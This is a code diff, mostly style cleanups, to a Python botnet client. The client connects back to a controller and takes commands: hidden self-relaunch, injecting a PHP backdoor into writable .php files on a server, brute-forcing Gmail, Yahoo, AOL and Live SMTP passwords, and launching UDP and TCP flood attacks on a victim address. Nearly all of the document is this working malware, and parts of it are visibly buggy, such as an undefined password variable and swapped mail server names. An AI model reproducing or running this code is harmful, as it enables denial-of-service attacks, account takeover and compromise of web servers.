@@ -22,11 +22,19 @@
 ## FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 ## IN THE SOFTWARE.
 
-import subprocess, os, sys, time, threading, smtplib, random, fnmatch, tempfile
-from socket import *
+import subprocess
+import os
+import sys
+import time
+import threading
+import smtplib
+import random
+import fnmatch
+import tempfile
+import socket
 from threading import Thread
 
-if (len(sys.argv) == 3):
+if len(sys.argv) == 3:
     host = sys.argv[1]
     port = int(sys.argv[2])
 else:
@@ -35,7 +43,7 @@ else:
     print("Usage: client.py <server ip> <server port>")
     host = '127.0.0.1'
     port = 9999
-    print("Using default values - {}:{}".format(host,port))
+    print("Using default values - {}:{}".format(host, port))
 
 frozen = getattr(sys, 'frozen', False)
 
@@ -48,12 +56,12 @@ def product(*args, **kwds):
     for prod in result:
         yield tuple(prod)
 
-def repeat(object, times=None):
+def _repeat(object, times=None):
     if times is None:
         while True:
             yield object
     else:
-        for i in range(times):
+        for _ in range(times):
             yield object
 
 # Self Update
@@ -94,12 +102,13 @@ if sys.platform == "win32":
         with open(tempfile.gettempdir() + r"/runner.vbs", "w") as f: f.write(runner)
         os.system(tempfile.gettempdir() + r'/runner.vbs "{exe} {arg} {host} {port}"')
 else: os.system(r"nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
-""".format(pid=os.getpid(), frozen=frozen, host=host, port=port, exe=sys.executable, arg=sys.argv[0])
+""".format(pid=os.getpid(), frozen=frozen, host=host,
+           port=port, exe=sys.executable, arg=sys.argv[0])
 
 def selfUpdate():
     while 1:
         filename = "%d.py" % random.randint(1, 1000)
-        if (not os.path.exists(filename)): break
+        if not os.path.exists(filename): break
 
     with open(filename, "w") as f:
         f.write(temporary)
@@ -107,14 +116,16 @@ def selfUpdate():
     if sys.platform == "win32":
         runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
         with open(tempfile.gettempdir() + "/runner.vbs", "w") as f: f.write(runner)
-        os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"'.format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
-    else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &".format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
+        os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"'
+                  .format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
+    else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &"
+                    .format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
 
 # PHP Infector
 backdoor = """
 <?php
 
-#TODO: Clean base64id: 55a1983
+#WARNING: Clean base64id: 55a1983
 
 #`base64_encode`, `base64_decode`, `bindec` and `decbin` Replacements to bypass Disablers-->
 $base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");
@@ -382,7 +393,7 @@ if (strpos($checker, "python") === False)
 """ % (host, port, os.path.realpath(__file__), host, port) #TODO: Fix Windows support.
 
 def find_files(directory, pattern):
-    for root, dirs, files in os.walk(directory):
+    for root, _, files in os.walk(directory):
         for basename in files:
             if fnmatch.fnmatch(basename, pattern):
                 filename = os.path.join(root, basename)
@@ -392,14 +403,14 @@ def debackdoor(thedir):
     allphp = find_files(thedir, '*.php')
 
     for thefile in allphp:
-        if ((os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK))):
+        if (os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK)):
             f = open(thefile, "r")
             inside = f.read()
             f.close()
 
-            if ("#TODO: Clean base64id: 55a1983" not in inside):
+            if "#WARNING: Clean base64id: 55a1983" not in inside:
                 alllines = inside.split('\n')
-                if (alllines[len(alllines)-1] != "?>"):
+                if alllines[len(alllines)-1] != "?>":
                     global backdoor
                     backdoor = "?>\n%s" % backdoor
 
@@ -416,7 +427,7 @@ def rmbackdoor(thedir):
             inside = f.read()
             f.close()
 
-            if ("#TODO: Clean base64id: 55a1983" in inside):
+            if ("#WARNING: Clean base64id: 55a1983" in inside):
                 inside = inside.replace(backdoor, "")
                 f = open(thefile, "w")
                 f.write(inside)
@@ -428,7 +439,7 @@ def savePass(password):
     f.close()
 
 def gmailbruteforce(email, combination, minimum, maximum):
-    smtpserver = smtplib.SMTP("smtp.gmail.com",587)
+    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
     smtpserver.starttls()
     smtpserver.ehlo()
 
@@ -436,8 +447,8 @@ def gmailbruteforce(email, combination, minimum, maximum):
 
     for n in range(minimum, maximum+1):
         if (found == False):
-            for w in product(combination,repeat=n):
-                word = ''.join(w)
+            for w in product(combination, repeat=n):
+                password = ''.join(w)
                 try: smtpserver.login(email, password)
                 except(smtplib.SMTPAuthenticationError) as msg:
                     if "Please Log" in str(msg):
@@ -452,20 +463,20 @@ def popularbruteforce(cmd):
     if cmd[0] == "yahoobruteforce": server = "smtp.mail.yahoo.com"
     elif cmd[0] == "livebruteforce": server = "stmp.aol.com"
     elif cmd[0] == "aolbruteforce": server = "smtp.live.com"
-    t = Thread(None,custombruteforce,None,(server, 587, bruteinfo[0],
-                                    bruteinfo[1], bruteinfo[2], bruteinfo[3]))
+    t = Thread(None, custombruteforce, None, (server, 587, bruteinfo[0], bruteinfo[1],
+                                              bruteinfo[2], bruteinfo[3]))
     t.start()
-        
+
 def custombruteforce(address, port, email, combination, minimum, maximum):
-    smtpserver = smtplib.SMTP(address,int(port))
+    smtpserver = smtplib.SMTP(address, int(port))
     smtpserver.starttls()
     smtpserver.ehlo()
 
     found = False
 
     for n in range(minimum, maximum+1):
-        if (found == False):
-            for w in product(combination,repeat=n):
+        if found == False:
+            for w in product(combination, repeat=n):
                 word = ''.join(w)
                 try:
                     smtpserver.login(email, password)
@@ -478,7 +489,7 @@ def custombruteforce(address, port, email, combination, minimum, maximum):
             break
 
 class udpFlood(threading.Thread):
-    def __init__ (self, victimip, victimport):
+    def __init__(self, victimip, victimport):
         threading.Thread.__init__(self)
         self.victimip = victimip
         self.victimport = victimport
@@ -487,8 +498,8 @@ class udpFlood(threading.Thread):
         timeout = time.time() + 60
         while True:
             test = 0
-            if (time.time() <= timeout):
-                s = socket(AF_INET, SOCK_DGRAM)
+            if time.time() <= timeout:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.connect((self.victimip, int(self.victimport)))
                 tmp = 'A' * 65000
                 s.send(bytes(tmp, 'utf-8'))
@@ -496,7 +507,7 @@ class udpFlood(threading.Thread):
                 break
 
 class tcpFlood(threading.Thread):
-    def __init__ (self, victimip, victimport):
+    def __init__(self, victimip, victimport):
         threading.Thread.__init__(self)
         self.victimip = victimip
         self.victimport = victimport
@@ -505,8 +516,8 @@ class tcpFlood(threading.Thread):
         timeout = time.time() + 60
         while True:
             test = 0
-            if (time.time() <= timeout):
-                s = socket(AF_INET, SOCK_STREAM)
+            if time.time() <= timeout:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(1)
                 s.connect((self.victimip, int(self.victimport)))
                 tmp = 'A' * 65000
@@ -520,7 +531,7 @@ def udpUnleach(victimip, victimport):
         thread = udpFlood(victimip, victimport)
         thread.start()
         threads.append(thread)
- 
+
     for thread in threads:
         thread.join()
 
@@ -530,7 +541,7 @@ def tcpUnleach(victimip, victimport):
         thread = tcpFlood(victimip, victimport)
         thread.start()
         threads.append(thread)
- 
+
     for thread in threads:
         thread.join()
 
@@ -538,22 +549,22 @@ def main(host, port):
     while 1:
         connected = False
         while 1:
-            while (connected == False):
+            while connected == False:
                 try:
-                    s=socket(AF_INET, SOCK_STREAM)
-                    s.connect((host,port))
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((host, port))
                     print("[INFO] Connected")
                     connected = True
                 except:
                     time.sleep(5)
 
             try:
-                msg=s.recv(20480).decode()
+                msg = s.recv(20480).decode()
                 print(msg)
                 allofem = msg.split(";")
                 for onebyone in allofem:
-                    commands = onebyone.split( )
-                    if (commands[0] == "cd"):
+                    commands = onebyone.split()
+                    if commands[0] == "cd":
                         try:
                             os.chdir(commands[1])
                             s.send(bytes(os.getcwd(), 'utf-8'))
@@ -562,17 +573,17 @@ def main(host, port):
                             s.send(bytes('[CLIENT - ERROR] Directory missing\n'
                                          + commands[1], 'utf-8'))
                             print("[INFO] %s directory not found" % os.getcwd())
-                    elif (commands[0] == "selfupdateall"):
+                    elif commands[0] == "selfupdateall":
                         selfUpdate()
                         return None
-                    elif (commands[0] == "setbackdoor"):
+                    elif commands[0] == "setbackdoor":
                         try:
                             debackdoor(commands[1])
                             s.send(bytes("[CLIENT] Backdoored\n", 'utf-8'))
                         except:
                             s.send(bytes("[CLIENT] Wrong arguments\n",
                                          'utf-8'))
-                    elif (commands[0] == "rmbackdoor"):
+                    elif commands[0] == "rmbackdoor":
                         try:
                             rmbackdoor(commands[1])
                             s.send(bytes("[CLIENT] Malicious PHP Removed\n",
@@ -580,11 +591,11 @@ def main(host, port):
                         except:
                             s.send(bytes("[CLIENT] Wrong arguments\n",
                                          'utf-8'))
-                    elif (commands[0] == "udpflood"):
+                    elif commands[0] == "udpflood":
                         try:
                             udpinfo = commands[1].split(":")
-                            t = Thread(None,udpUnleach,None,(udpinfo[0],
-                                                             udpinfo[1]))
+                            t = Thread(None, udpUnleach, None, (udpinfo[0],
+                                                                udpinfo[1]))
                             t.start()
                             s.send(bytes("[CLIENT] Flooding started\n",
                                          'utf-8'))
